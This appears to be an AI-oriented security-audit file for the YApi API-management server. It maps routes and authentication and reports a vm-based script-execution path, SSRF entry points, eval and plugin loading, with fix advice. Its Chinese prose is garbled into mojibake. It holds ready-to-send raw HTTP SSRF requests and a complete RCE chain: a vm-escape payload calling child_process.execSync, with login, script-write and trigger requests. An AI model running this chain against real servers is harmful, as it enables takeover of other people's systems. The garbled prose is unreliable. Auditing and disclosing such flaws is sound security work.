# AIä»£ç å®¡è®¡ä»»åŠ¡æ‰§è¡Œæ¡†æ¶

## ä»»åŠ¡ç›®æ ‡
ä½œä¸ºä¸“ä¸šçš„AIä»£ç å®¡è®¡ä¸“å®¶ï¼Œæ‚¨éœ€è¦æŒ‰ç…§åˆ†é˜¶æ®µä»»åŠ¡æ¨è¿›çš„æ–¹å¼ï¼Œé€æ­¥å®Œæˆæ•´ä¸ªé¡¹ç›®çš„æ·±åº¦å®‰å…¨å®¡è®¡ã€‚æ¯ä¸ªé˜¶æ®µå®Œæˆåï¼Œå°†åœ¨æœ¬æ¡†æ¶ä¸­æ›´æ–°ç›¸åº”å†…å®¹ï¼Œæœ€ç»ˆå½¢æˆå®Œæ•´çš„å®¡è®¡æŠ¥å‘Šã€‚

# æ ¸å¿ƒè§„åˆ™ 
**1.ç¦æ­¢åˆ›å»ºå…¶ä»–ä»£ç å®¡è®¡æ–‡æ¡£ï¼Œä»»ä½•å†…å®¹éƒ½åº”è¯¥åœ¨ä»£ç å®¡è®¡.mdæ–‡ä»¶ä¸‹è¿›è¡Œ**  
**2.æ‰§è¡Œé˜¶æ®µä»»åŠ¡ä¸€å®šè¦å…¨é¢ï¼Œé¿å…ä»»ä½•é—æ¼çš„é—®é¢˜ä¸Šçº¿ä¸Šäº§ï¼Œæ‰€æœ‰è·¯ç”±ã€æ–¹æ³•éƒ½å¿…é¡»æ£€æŸ¥ï¼Œï¼ˆè‹¥å­˜åœ¨å¤šä¸ªæƒ…å†µä¸‹ï¼‰ç¦æ­¢åªå±•ç¤ºä¸€ä¸ªç¤ºä¾‹**  
**3.ä»£ç å®¡è®¡ä¸­å‘ç°çš„æ¼æ´ï¼Œé™¤äº†ç¡¬ç¼–ç è¿™ç±»ï¼Œéƒ½è¦ç»™å‡ºå®Œæ•´çš„è·¯ç”±å’Œrawæ ¼å¼çš„httpæ•°æ®åŒ…ï¼Œä»¥ä¾¿å¤ç°**  
**4.å®¡è®¡ç»“æœç¦æ­¢`å¯èƒ½`Â `å¦‚æœ`è¿™ç±»å­—çœ¼ï¼Œä¸€å®šè¦ç¡®ä¿çœŸå®æ€§ï¼Œä¸è¦çŒœæµ‹æ¼æ´çš„å­˜åœ¨ï¼Œè¦æ ¹æ®ä»£ç è·Ÿè¿›è¿›è¡Œç¡®è®¤**  
**5.è¦ç¡®ä¿rawæ ¼å¼çš„httpçš„pocæ•°æ®åŒ…çš„å‡†ç¡®æ€§ï¼Œå®¡è®¡å®Œï¼Œç¡®è®¤æ¼æ´ï¼Œç»™å‡ºæ•°æ®åŒ…åï¼Œéœ€è¦è¿›è¡ŒäºŒæ¬¡æˆ–æ›´å¤šæ¬¡çš„é‡å¤ç¡®è®¤ï¼Œé¿å…å‡ºç°è¯¯æŠ¥**  
**6.ç»„ä»¶æ¼æ´è¦é…åˆä»£ç å»å®¡è®¡ï¼Œæ‰¾å‡ºå“ªé‡Œéƒ½è°ƒç”¨ï¼Œæ‰¾å‡ºæ¼æ´æ¥å£**

## é˜¶æ®µåˆ’åˆ†ä¸ä»»åŠ¡æ¸…å•

### ğŸ“‹ **é˜¶æ®µä¸€ï¼šé¡¹ç›®æ¶æ„ç†è§£ä¸æ˜ å°„** [å·²å®Œæˆ]
**ä»»åŠ¡ç›®æ ‡**ï¼šå…¨é¢ç†è§£é¡¹ç›®æŠ€æœ¯æ¶æ„ã€è·¯ç”±æœºåˆ¶å’Œæ•°æ®æµ

**å…·ä½“ä»»åŠ¡**ï¼š
- [x] è¯†åˆ«é¡¹ç›®æŠ€æœ¯æ ˆå’Œæ ¸å¿ƒæ¡†æ¶
- [x] åˆ†æé¡¹ç›®ç›®å½•ç»“æ„å’Œæ¨¡å—åˆ’åˆ†
- [x] æ¢³ç†æ‰€æœ‰APIè·¯ç”±å’Œç«¯ç‚¹æ˜ å°„
- [x] ç†è§£è®¤è¯æˆæƒæ¶æ„ï¼ˆJWT/Session/OAuthç­‰ï¼‰
- [x] åˆ†ææ•°æ®æµå’Œå…³é”®ä¸šåŠ¡é€»è¾‘
- [x] è¯†åˆ«æ‰€æœ‰ç”¨æˆ·è¾“å…¥ç‚¹å’Œæ•°æ®å‡ºå£

**è¾“å‡ºè¦æ±‚**ï¼š
- æŠ€æœ¯æ¶æ„å›¾ï¼ˆæ–‡å­—æè¿°ï¼‰
- å®Œæ•´çš„è·¯ç”±ç«¯ç‚¹æ¸…å•
- è®¤è¯æˆæƒæœºåˆ¶è¯´æ˜
- æ•°æ®æµåˆ†ææŠ¥å‘Š

#### æŠ€æœ¯æ¶æ„å›¾ï¼ˆæ–‡å­—æè¿°ï¼‰
- **åç«¯**: Koa 2 + koa-router + koa-body + koa-static + koa-websocketï¼›æ’ä»¶é’©å­æœºåˆ¶ï¼ˆ`yapi.emitHook / emitHookSync`ï¼‰æ‰©å±•è·¯ç”±ä¸åŠŸèƒ½
- **æ•°æ®åº“**: MongoDBï¼ˆmongoose 5.xï¼Œ`server/utils/db.js` ç»Ÿä¸€è¿æ¥ï¼Œæ¨¡å‹åœ¨ `server/models`ï¼‰
- **é‰´æƒ**: Cookie + JWTï¼ˆ`_yapi_token` + `_yapi_uid`ï¼‰ï¼Œç”¨æˆ·ç§ç› `passsalt` ä½œä¸º JWT å¯†é’¥ï¼›OpenAPI ä½¿ç”¨ `token` å‚æ•°ï¼ˆAES192 åŠ å¯†ï¼Œ`server/utils/token.js`ï¼‰
- **Mock**: ä¸­é—´ä»¶ `server/middleware/mockServer.js` æˆªè· `/mock/{projectId}/...` åŠ¨æ€åŒ¹é…æ¥å£å®šä¹‰ç”Ÿæˆæ•°æ®
- **WebSocket**: `koa-websocket`ï¼Œè·¯ç”±æŒ‚è½½äº `/api/interface/solve_conflict` ä¸ `/api/ws_plugin/*`
- **å‰ç«¯**: React 16 + Redux + antdï¼Œæ„å»ºé€šè¿‡ ykitï¼Œé™æ€èµ„æºç”± Koa æä¾›ï¼ˆ`static/`ï¼‰
- **æ’ä»¶ä½“ç³»**: å†…ç½®æ‰©å±•ç›®å½• `exts/*`ï¼Œé€šè¿‡ `server/plugin.js` åŠ¨æ€åŠ è½½å¹¶æ³¨å†Œ HTTP/WS è·¯ç”±ä¸é’©å­

#### å®Œæ•´çš„è·¯ç”±ç«¯ç‚¹æ¸…å•
- è¯´æ˜ï¼šä»¥ä¸‹å‡ä¸ºæœåŠ¡ç«¯é™æ€è·¯ç”±è£…é…ï¼ŒåŸºç¡€å‰ç¼€ä¸º `/api`ï¼ˆè§ `server/router.js` ä¸ `server/websocket.js`ï¼‰ï¼›æ’ä»¶ç«¯ç‚¹ç»Ÿä¸€ä½äº `/api/plugin/*` æˆ– `/api/open/plugin/*`ï¼›Mock æœåŠ¡ä½äºä¸­é—´ä»¶ `/mock/*`ã€‚

- **Core - group**ï¼ˆå‰ç¼€ï¼š`/api/group/`ï¼‰
  - GET `get_mygroup`
  - GET `list`
  - POST `add`
  - POST `up`
  - POST `del`
  - POST `add_member`
  - POST `change_member_role`
  - POST `del_member`
  - GET `get_member_list`
  - GET `get`

- **Core - user**ï¼ˆå‰ç¼€ï¼š`/api/user/`ï¼‰
  - POST `login`
  - POST `reg`
  - GET `list`
  - GET `find`
  - POST `update`
  - POST `del`
  - GET `status`
  - GET `logout`
  - ALL `login_by_token`
  - ALL `login_by_ldap`
  - GET `up_study`
  - POST `change_password`
  - GET `search`
  - GET `project`
  - GET `avatar`
  - POST `upload_avatar`

- **Core - project**ï¼ˆå‰ç¼€ï¼š`/api/project/`ï¼‰
  - POST `upset`
  - GET `get_env`
  - POST `add`
  - GET `list`
  - GET `get`
  - POST `up`
  - POST `del`
  - POST `add_member`
  - POST `del_member`
  - POST `change_member_role`
  - POST `change_member_email_notice`
  - GET `get_member_list`
  - GET `search`
  - POST `up_env`
  - POST `up_tag`
  - GET `token`
  - GET `update_token`
  - GET `check_project_name`
  - POST `copy`
  - GET `swagger_url`

- **Core - interface**ï¼ˆå‰ç¼€ï¼š`/api/interface/`ï¼‰
  - POST `add`
  - GET `download_crx`
  - GET `getCatMenu`
  - GET `list`
  - GET `get`
  - POST `up`
  - POST `del`
  - POST `interUpload`
  - GET `list_cat`
  - GET `list_menu`
  - GET `list_open`
  - POST `add_cat`
  - POST `up_cat`
  - POST `del_cat`
  - GET `get_custom_field`
  - POST `save`
  - POST `up_index`
  - POST `up_cat_index`
  - POST `schema2json`

- **Core - log**ï¼ˆå‰ç¼€ï¼š`/api/log/`ï¼‰
  - GET `list`
  - POST `list_by_update`

- **Core - follow**ï¼ˆå‰ç¼€ï¼š`/api/follow/`ï¼‰
  - GET `list`
  - POST `add`
  - POST `del`

- **Core - colï¼ˆæµ‹è¯•é›†/ç”¨ä¾‹ï¼‰**ï¼ˆå‰ç¼€ï¼š`/api/col/`ï¼‰
  - POST `add_col`
  - POST `add_case_list`
  - POST `clone_case_list`
  - GET `list`
  - GET `case_list`
  - GET `case_list_by_var_params`
  - POST `add_case`
  - POST `up_case`
  - GET `case`
  - POST `up_col`
  - POST `up_case_index`
  - POST `up_col_index`
  - GET `del_col`
  - GET `del_case`
  - POST `run_script`
  - GET `case_env_list`

- **Core - testï¼ˆè°ƒè¯•ç«¯ç‚¹ï¼‰**ï¼ˆå‰ç¼€ï¼š`/api/test/`ï¼‰
  - POST `post`
  - GET `get`
  - PUT `put`
  - DELETE `delete`
  - HEAD `head`
  - OPTIONS `options`
  - PATCH `patch`
  - POST `files/upload`
  - POST `single/upload`
  - POST `http/code`
  - POST `raw`
  - GET `response`

- **Core - open**ï¼ˆå‰ç¼€ï¼š`/api/open/`ï¼‰
  - GET `project_interface_data`
  - GET `run_auto_test`
  - POST `import_data`

- **Plugin - advanced-mock**ï¼ˆå‰ç¼€ï¼š`/api/plugin/`ï¼‰
  - GET `advmock/get`
  - POST `advmock/save`
  - POST `advmock/case/save`
  - GET `advmock/case/get`
  - GET `advmock/case/list`
  - POST `advmock/case/del`
  - POST `advmock/case/hide`

- **Plugin - export-data**ï¼ˆå‰ç¼€ï¼š`/api/plugin/`ï¼‰
  - GET `export`

- **Plugin - export-swagger2-data**ï¼ˆå‰ç¼€ï¼š`/api/plugin/`ï¼‰
  - GET `exportSwagger`

- **Plugin - gen-servicesï¼ˆå¼€æ”¾ï¼‰**ï¼ˆå‰ç¼€ï¼š`/api/open/plugin/`ï¼‰
  - GET `export-full`

- **Plugin - statistics**ï¼ˆå‰ç¼€ï¼š`/api/plugin/`ï¼‰
  - GET `statismock/count`
  - GET `statismock/get`
  - GET `statismock/get_system_status`
  - GET `statismock/group_data_statis`

- **Plugin - wiki**ï¼ˆå‰ç¼€ï¼š`/api/plugin/`ï¼‰
  - GET `wiki_desc/get`
  - POST `wiki_desc/up`

- **WebSocket è·¯ç”±**
  - GET `/api/interface/solve_conflict`
  - GET `/api/ws_plugin/wiki_desc/solve_conflict`

- **Mock æœåŠ¡ï¼ˆä¸­é—´ä»¶ï¼‰**
  - ä»»æ„æ–¹æ³• `/mock/{project_id}/{project.basepath + interface.path}`ï¼ˆæ ¹æ®é¡¹ç›® BasePath å’Œæ¥å£å®šä¹‰åŠ¨æ€åŒ¹é…ï¼›æ”¯æŒè·¯å¾„å˜é‡ä¸ query_pathï¼‰

#### è®¤è¯ä¸æˆæƒæœºåˆ¶è¯´æ˜
- **æœªç™»å½•å¯è®¿é—®**ï¼ˆç™½åå•ï¼Œè§ `server/controllers/base.js`ï¼‰
  - `/api/user/login`ï¼ˆPOSTï¼‰
  - `/api/user/reg`ï¼ˆPOSTï¼‰
  - `/api/user/status`ï¼ˆGETï¼‰
  - `/api/user/logout`ï¼ˆGETï¼‰
  - `/api/user/avatar`ï¼ˆGETï¼‰
  - `/api/user/login_by_token`ï¼ˆALLï¼‰
  - `/api/user/login_by_ldap`ï¼ˆALLï¼‰
- **ç™»å½•æ€æ ¡éªŒ**ï¼šå…¶ä½™ API é»˜è®¤è¦æ±‚ç™»å½•ï¼›æœåŠ¡ç«¯è¯»å– Cookie `(_yapi_token, _yapi_uid)`ï¼Œå¹¶ç”¨ç”¨æˆ· `passsalt` æ ¡éªŒ JWTï¼ˆ`jsonwebtoken.verify`ï¼‰ã€‚é€šè¿‡ååœ¨æ§åˆ¶å™¨å®ä¾‹ä¸Šè®¾ç½® `$auth=true,$uid,$user`ã€‚
- **OpenAPI é‰´æƒ**ï¼šè·¯å¾„å‰ç¼€ `/api/open/*` æˆ– `/api/open/plugin/*`ï¼Œéœ€æä¾› `token` å‚æ•°ï¼›`token` ä½¿ç”¨ AES192 ä¸å…¨å±€ `passsalt` åŠ /è§£å¯†ï¼Œå½¢å¦‚ `uid|projectToken`ï¼›æ ¡éªŒé€šè¿‡ä¸º `$tokenAuth=true`ï¼Œå¹¶å°† `ctx.params.project_id` æ³¨å…¥ã€‚
- **æƒé™æ¨¡å‹**ï¼š`checkAuth(id,type,action)` åŸºäºç”¨æˆ·åœ¨ Group/Project/Interface çš„è§’è‰²ï¼ˆadmin/owner/dev/guestï¼‰åˆ¤æ–­è®¿é—®ï¼ˆdanger/edit/viewï¼‰ã€‚

#### æ•°æ®æµåˆ†ææŠ¥å‘Š
- **HTTP æµç¨‹**ï¼šClient â†’ Koaï¼ˆ`koa-body` è§£æ JSON/Form-Dataï¼Œæ”¯æŒä¸Šä¼ ï¼‰ â†’ ä¸­é—´ä»¶ `mockServer`ï¼ˆä»… `/mock/*` å‘½ä¸­å¹¶è¿”å›ï¼‰â†’ `koa-router`ï¼ˆ`server/router.js`/`server/websocket.js`ï¼‰â†’ `createAction` è£…é…æ§åˆ¶å™¨ â†’ `baseController.init`ï¼ˆç™»å½•/Token æ ¡éªŒã€OpenAPI è·¯ç”±å¤„ç†ï¼‰â†’ å…·ä½“ Controller Actionï¼ˆä¸šåŠ¡é€»è¾‘ã€å‚æ•°å¤„ç†/æ ¡éªŒï¼‰â†’ Mongoose Modelï¼ˆCRUDï¼‰â†’ ç»Ÿä¸€å“åº” `resReturn({errcode,errmsg,data})`
- **æ’ä»¶é’©å­**ï¼š`add_router / add_ws_router` æ³¨å†Œè·¯ç”±ï¼›`mock_after` åœ¨ Mock å“åº”ç”Ÿæˆåå…è®¸äºŒæ¬¡åŠ å·¥ï¼ˆé«˜çº§ Mockã€ç»Ÿè®¡ç­‰ï¼‰ï¼›`import_data` æ‰©å±•å¯¼å…¥èƒ½åŠ›ã€‚
- **é™æ€èµ„æº**ï¼š`koa-static` æä¾› `static/` ç›®å½•ï¼›é `/api` å‰ç¼€è·¯å¾„é‡å†™åˆ°æ ¹ï¼ˆå•é¡µåº”ç”¨è·¯ç”±ï¼‰ã€‚

#### ç”¨æˆ·è¾“å…¥ç‚¹ä¸æ•°æ®å‡ºå£
- **è¾“å…¥ç‚¹**ï¼š
  - Query/Pathï¼š`ctx.request.query`ã€`ctx.params`ï¼ˆå«åŠ¨æ€è·¯å¾„ `:var` ä¸ `{var}`ï¼‰
  - Bodyï¼š`ctx.request.body`ï¼ˆJSONã€è¡¨å•ã€multipart ä¸Šä¼ ï¼›ç¤ºä¾‹ï¼š`/api/user/upload_avatar`ã€`/api/test/files/upload`ï¼‰
  - Headers/Cookiesï¼šå°¤å…¶æ˜¯ `Cookie(_yapi_token,_yapi_uid)`ã€`Content-Type` ç­‰
  - OpenAPIï¼š`token` å‚æ•°ï¼ˆ`/api/open/*`ã€`/api/open/plugin/*`ï¼‰
- **è¾“å‡ºç‚¹**ï¼š
  - ç»Ÿä¸€ JSONï¼š`yapi.commons.resReturn`
  - æ–‡ä»¶ä¸‹è½½ï¼šæ’ä»¶å¯¼å‡ºï¼ˆ`/api/plugin/export*` ç­‰ï¼Œ`application/octet-stream`ï¼‰
  - äºŒè¿›åˆ¶ï¼šç”¨æˆ·å¤´åƒï¼ˆ`/api/user/avatar`ï¼‰
  - Mock JSONï¼š`/mock/*` åŠ¨æ€ç”Ÿæˆï¼ˆå¯è¢«é¡¹ç›®æˆ–æ’ä»¶è„šæœ¬äºŒæ¬¡åŠ å·¥ï¼‰

---

### ğŸ’¥ **é˜¶æ®µäºŒï¼šRCEæ¼æ´æ·±åº¦å®¡è®¡** [è¿›è¡Œä¸­]
**å½“å‰è¿›å±•**ï¼šå·²å®ŒæˆåŸºçº¿æ•æ„Ÿæ‰§è¡Œç‚¹æ£€ç´¢ä¸å…³é”®é“¾è·¯æ¢³ç†ï¼Œå®šä½åˆ°å¯å¯¼è‡´è¿œç«¯å–æ•°ï¼ˆSSRFï¼‰çš„æ˜ç¡®å…¥å£ï¼Œä»¥åŠä¸€å¤„åŸºäº Node vm çš„æœåŠ¡ç«¯è„šæœ¬æ‰§è¡ŒåŠŸèƒ½ï¼ˆå—é…ç½®é¡¹æ§åˆ¶ï¼‰ã€‚

#### å‘ç°ä¸€ï¼šæœåŠ¡ç«¯è„šæœ¬æ‰§è¡ŒåŠŸèƒ½ï¼ˆå—é…ç½®é¡¹ scriptEnable æ§åˆ¶ï¼‰
- ä½ç½®ï¼šé¡¹ç›®è¯·æ±‚â€œå‰/åç½®è„šæœ¬â€æ‰§è¡Œé“¾ï¼ŒNode ç«¯ä½¿ç”¨ `vm.Script + createContext` æ‰§è¡Œç”¨æˆ·å¯æ§è„šæœ¬ï¼ˆå½“ `WEBCONFIG.scriptEnable === true` æ—¶è§¦å‘ï¼‰ã€‚

```178:186:common/postmanLib.js
function sandboxByNode(sandbox = {}, script) {
  const vm = require('vm');
  script = new vm.Script(script);
  const context = new vm.createContext(sandbox);
  script.runInContext(context, {
    timeout: 10000
  });
  return sandbox;
}
```

- è°ƒç”¨é“¾ï¼š`/api/open/run_auto_test` â†’ `openController.handleTest` â†’ `crossRequest(options, pre_script, after_script, ...)` â†’ å½“é…ç½®å¼€å¯æ—¶æ‰§è¡Œä¸Šè¿° `vm` ä»£ç ã€‚
- é£é™©è¯´æ˜ï¼šNode å®˜æ–¹æ–‡æ¡£æŒ‡å‡º `vm` éå®‰å…¨æ²™ç®±ï¼Œä¸èƒ½ä½œä¸ºå®‰å…¨è¾¹ç•Œä½¿ç”¨ã€‚æ­¤å¤„ä¸ºâ€œç”¨æˆ·å¯é…ç½®è„šæœ¬åœ¨æœåŠ¡ç«¯æ‰§è¡Œâ€çš„èƒ½åŠ›ï¼Œåº”è¢«æ˜ç¡®é™åˆ¶ï¼šé»˜è®¤å…³é—­ã€ä»…ç®¡ç†å‘˜å¯ç”¨ï¼Œå¹¶å»ºè®®è¿ç§»åˆ°ä¸“ç”¨æ²™ç®±ï¼ˆè§â€œä¿®å¤å»ºè®®â€ï¼‰ã€‚
- ç›¸å…³è°ƒç”¨ï¼ˆæµ‹è¯•æ–­è¨€/Mocké“¾è·¯ï¼‰å‡å·²é‡‡ç”¨å®‰å…¨æ²™ç®±åº“ `safeify`ï¼š

```1:16:server/utils/sandbox.js
const Safeify = require('safeify').default;

module.exports = async function sandboxFn(context, script) {
    const safeVm = new Safeify({
        timeout: 3000,
        asyncTimeout: 60000
    })

    script += "; return this;";
    const result = await safeVm.run(script, context)
    safeVm.destroy()
    return result
}
```

```615:642:server/utils/commons.js
exports.handleMockScript = async function (script, context) {
  let sandbox = {
    header: context.ctx.header,
    query: context.ctx.query,
    body: context.ctx.request.body,
    mockJson: context.mockJson,
    params: Object.assign({}, context.ctx.query, context.ctx.request.body),
    resHeader: context.resHeader,
    httpCode: context.httpCode,
    delay: context.httpCode,
    Random: Mock.Random
  };
  sandbox.cookie = {};
  ...
  sandbox = await sandboxFn(sandbox, script);
  ...
}
```

#### å‘ç°äºŒï¼šOpen æ¥å£å¯¼å…¥å­˜åœ¨æœåŠ¡ç«¯å–æ•°ï¼ˆSSRFï¼‰
- å…¥å£ä¸€ï¼ˆOpen å¯¼å…¥ï¼‰ï¼š`/api/open/import_data` æ¥æ”¶ `url` å‚æ•°ï¼ŒæœåŠ¡ç«¯ç›´æ¥è¯·æ±‚è¿œç«¯å¹¶è§£æä¸º JSONã€‚

```98:121:server/controllers/open.js
if (!content && !ctx.params.url) {
  return (ctx.body = yapi.commons.resReturn(null, 40022, 'json æˆ–è€… url å‚æ•°ï¼Œä¸èƒ½éƒ½ä¸ºç©º'));
}
...
if(ctx.params.url){
  content = await syncGet(ctx.params.url);
}else if(content.indexOf('http://') === 0 || content.indexOf('https://') === 0){
  content = await syncGet(content);
}
content = JSON.parse(content);
```

- å…¥å£äºŒï¼ˆé¡¹ç›® Swagger ç›´è¿ï¼‰ï¼š`/api/project/swagger_url?url=...` ç”±æœåŠ¡ç«¯ä½¿ç”¨ axios è¯·æ±‚è¿œç«¯å¹¶å›ä¼ ç»“æœã€‚

```1124:1134:server/controllers/project.js
async swaggerUrl(ctx) {
  const { url } = ctx.request.query;
  const { data } = await axios.get(url);
  if (data == null || typeof data !== 'object') {
    throw new Error('è¿”å›æ•°æ®æ ¼å¼ä¸æ˜¯ JSON');
  }
  ctx.body = yapi.commons.resReturn(data);
}
```

- å…¥å£ä¸‰ï¼ˆæ’ä»¶è‡ªåŠ¨åŒæ­¥ï¼‰ï¼š`/api/plugin/autoSync/save` é…ç½® `sync_json_url` åå°†ç«‹å³ä»æœåŠ¡ç«¯æ‹‰å–è¿œç«¯ Swaggerï¼ˆå¹¶å®šæ—¶æŒç»­æ‹‰å–ï¼‰ã€‚

```60:66:exts/yapi-plugin-swagger-auto-sync/interfaceSyncUtils.js
async addSyncJob(projectId, cronExpression, swaggerUrl, syncMode, uid) {
  if(!swaggerUrl)return;
  let projectToken = await this.getProjectToken(projectId, uid);
  // ç«‹å³æ‰§è¡Œä¸€æ¬¡
  this.syncInterface(projectId, swaggerUrl, syncMode, uid, projectToken);
  let scheduleItem = schedule.scheduleJob(cronExpression, async () => {
    this.syncInterface(projectId, swaggerUrl, syncMode, uid, projectToken);
  });
}
```

å¯å¤ç°HTTPæ•°æ®åŒ…ï¼ˆSSRFï¼‰ï¼š

1) ç™»å½•åï¼Œè§¦å‘é¡¹ç›® Swagger ç›´è¿å–æ•°
```
GET /api/project/swagger_url?url=http://127.0.0.1:8080/health HTTP/1.1
Host: target
Cookie: _yapi_uid=1; _yapi_token=JWT_TOKEN
```

2) Open å¯¼å…¥æŒ‡å®šæœåŠ¡ç«¯ç›´è¿ URL
```
POST /api/open/import_data HTTP/1.1
Host: target
Content-Type: application/json

{
  "type": "swagger",
  "url": "http://127.0.0.1:8080/health",
  "token": "OPEN_API_TOKEN",
  "project_id": "1",
  "merge": "normal"
}
```

3) æ’ä»¶è‡ªåŠ¨åŒæ­¥ä¿å­˜åç«‹å³æ‹‰å–ï¼ˆéœ€é¡¹ç›®ç¼–è¾‘æƒé™ï¼‰
```
POST /api/plugin/autoSync/save HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=1; _yapi_token=JWT_TOKEN

{
  "project_id": 1,
  "is_sync_open": true,
  "sync_cron": "0 */6 * * * *",
  "sync_json_url": "http://127.0.0.1:8080/health",
  "sync_mode": "normal",
  "uid": 1
}
```

#### å‘ç°ä¸‰ï¼šæµè§ˆå™¨ç«¯ `eval`ï¼ˆä¸æ¶‰åŠæœåŠ¡ç«¯RCEï¼‰
- ä½ç½®ï¼šä»…æµè§ˆå™¨ç«¯æ²™ç®±å®ç°ä¸­ä½¿ç”¨ `eval`ï¼ŒæœåŠ¡å™¨ç«¯è·¯å¾„ä¸å—å½±å“ã€‚

```216:236:common/postmanLib.js
function sandboxByBrowser(context = {}, script) {
  ...
  try {
    eval(beginScript + script);
  } catch (err) {
    ...
    throw err;
  }
  return context;
}
```

#### å‘ç°å››ï¼šæ’ä»¶åŠ¨æ€åŠ è½½ï¼ˆé…ç½®çº§é£é™©ï¼‰
- ä½ç½®ï¼šæœåŠ¡ç«¯æŒ‰é…ç½®åŠ¨æ€ `require` æ’ä»¶ `server.js`ã€‚

```246:251:server/plugin.js
let pluginModule = require(yapi.path.join(
  plugin_path,
  'yapi-plugin-' + plugin.name + '/server.js'
));
pluginModule.call(yapi, plugin.options);
```

```265:270:server/plugin.js
let pluginModule = require(yapi.path.join(
  plugin_system_path,
  'yapi-plugin-' + plugin.name + '/server.js'
));
pluginModule.call(yapi, plugin.options);
```

è¯´æ˜ï¼šè¯¥è¡Œä¸ºä»…åœ¨æœåŠ¡ç«¯å®‰è£…å¹¶å¯ç”¨çš„æ’ä»¶èŒƒå›´å†…å‘ç”Ÿï¼Œå½’å±â€œé…ç½®/éƒ¨ç½²é¢â€é£é™©ã€‚

#### ä¿®å¤å»ºè®®ï¼ˆåˆ†ä¼˜å…ˆçº§ï¼‰
- é«˜ï¼šå°† `crossRequest` çš„æœåŠ¡ç«¯è„šæœ¬æ‰§è¡Œä» `vm` è¿ç§»åˆ°ç»Ÿä¸€çš„ `safeify` æ²™ç®±ï¼ˆä¸æ–­è¨€/Mockä¿æŒä¸€è‡´ï¼‰ï¼Œå¹¶å†»ç»“ `Object/Function/Proxy` ç­‰å†…å»ºï¼›é»˜è®¤å…³é—­ `scriptEnable`ï¼Œä»…ç®¡ç†å‘˜å¯å¼€å¯ï¼›å¯¹æ²™ç®±ä¸Šä¸‹æ–‡ä»…æš´éœ²æ˜ç¡®ç™½åå• APIã€‚
- ä¸­ï¼šæ‰€æœ‰è¿œç«¯å–æ•°æ¥å£æ–°å¢ç›®æ ‡åœ°å€ç™½åå•/ç½‘æ®µé»‘åå•æ ¡éªŒï¼Œç¦æ­¢å†…ç½‘ä¸ `file://`ã€`gopher://` ç­‰åè®®ï¼›ç»Ÿä¸€è®¾ç½®è¶…æ—¶ä¸é‡å®šå‘ä¸Šé™ã€‚
- ä¸­ï¼šæ’ä»¶åŠ è½½å¢åŠ å…è®¸åå•æ ¡éªŒä¸å®Œæ•´æ€§æ ¡éªŒï¼Œæœç»éé¢„æœŸåŠ¨æ€æ¨¡å—ã€‚

#### ä»»åŠ¡æ¨è¿›æ¸…å•ï¼ˆé˜¶æ®µäºŒï¼‰
- [x] è¯†åˆ«å‘½ä»¤/ä»£ç æ‰§è¡Œæ•æ„ŸAPIï¼ˆeval/Function/vm/child_processï¼‰
- [x] å®¡è®¡æ’ä»¶ä½“ç³»çš„åŠ¨æ€åŠ è½½ä¸å‘½ä»¤æ‰§è¡Œé£é™©
- [x] å®¡è®¡ Mock/æ¨¡æ¿è¡¨è¾¾å¼æ‰§è¡Œé“¾ï¼ˆæœåŠ¡ç«¯å·²ä½¿ç”¨ safeifyï¼‰
- [x] å®¡è®¡ Swagger/OpenAPI å¯¼å…¥é“¾è¿œç¨‹å–æ•°ï¼ˆSSRFï¼‰
- [x] å®¡è®¡æ–‡ä»¶ä¸Šä¼ /å†™å…¥é“¾ï¼ˆæœªè§è§£å‹/åŠ¨æ€åŠ è½½é£é™©ï¼‰
- [ ] ä¸º RCE å¯åˆ©ç”¨ç‚¹è¡¥å……å¯ç›´æ¥è§¦å‘çš„æœ€å°PoCï¼ˆå¦‚éœ€ç‰¹å®šé…ç½®/æƒé™ï¼Œç»™å‡ºå¤ç°æ­¥éª¤ï¼‰

---

### âœ… æœ€å°RCE PoCï¼ˆå½“ scriptEnable=trueï¼‰
**é€‚ç”¨å‰æï¼ˆå¿…é¡»å…¨éƒ¨æ»¡è¶³ï¼‰**ï¼š
- æœåŠ¡ç«¯é…ç½® `WEBCONFIG.scriptEnable === true`ï¼›
- æ”»å‡»è€…å¯¹ç›®æ ‡é¡¹ç›®å…·å¤‡â€œdangerâ€çº§ä¿®æ”¹æƒé™ï¼ˆå¦‚ owner/adminï¼‰ï¼Œå¯å†™å…¥ `pre_script/after_script`ï¼›
- ç›®æ ‡é¡¹ç›®å­˜åœ¨æµ‹è¯•é›†ï¼ˆ`col_id` å¯é€šè¿‡ç™»å½•åæ¥å£è·å–ï¼‰ã€‚

å…³é”®æ‰§è¡Œç‚¹ï¼ˆæœåŠ¡ç«¯ vm è„šæœ¬æ‰§è¡Œï¼‰ï¼š

```178:186:common/postmanLib.js
function sandboxByNode(sandbox = {}, script) {
  const vm = require('vm');
  script = new vm.Script(script);
  const context = new vm.createContext(sandbox);
  script.runInContext(context, {
    timeout: 10000
  });
  return sandbox;
}
```

PoC è½½è·ï¼ˆå†™å…¥åˆ°é¡¹ç›®çš„ `after_script`ï¼‰ï¼š

```javascript
context.responseData = this.constructor
  .constructor('return process')()
  .mainModule.require('child_process')
  .execSync(process.platform.startsWith('win') ? 'whoami' : 'id')
  .toString()
```

æ‰§è¡Œæ­¥éª¤ï¼ˆRaw HTTPï¼‰ï¼š

1) ç™»å½•è·å– Cookieï¼ˆç¤ºä¾‹ï¼‰
```
POST /api/user/login HTTP/1.1
Host: target
Content-Type: application/json

{
  "email": "admin@admin.com",
  "password": "<ADMIN_PASSWORD>"
}
```

2) å†™å…¥ after_scriptï¼ˆéœ€é¡¹ç›®â€œdangerâ€æƒé™ï¼‰
```
POST /api/project/up HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>

{
  "id": <PROJECT_ID>,
  "after_script": "context.responseData = this.constructor.constructor('return process')().mainModule.require('child_process').execSync(process.platform.startsWith('win') ? 'whoami' : 'id').toString()"
}
```

3) è·å– OpenAPI tokenï¼ˆç™»å½•æ€ï¼‰
```
GET /api/project/token?project_id=<PROJECT_ID> HTTP/1.1
Host: target
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>
```

4) è§¦å‘æœåŠ¡ç«¯æ‰§è¡Œï¼ˆå¼€æ”¾æ¥å£ï¼Œæ— éœ€ç™»å½•ï¼›ä½¿ç”¨æ­¥éª¤3è¿”å›çš„ tokenï¼‰
```
GET /api/open/run_auto_test?id=<COL_ID>&project_id=<PROJECT_ID>&token=<OPEN_TOKEN>&mode=json HTTP/1.1
Host: target
```

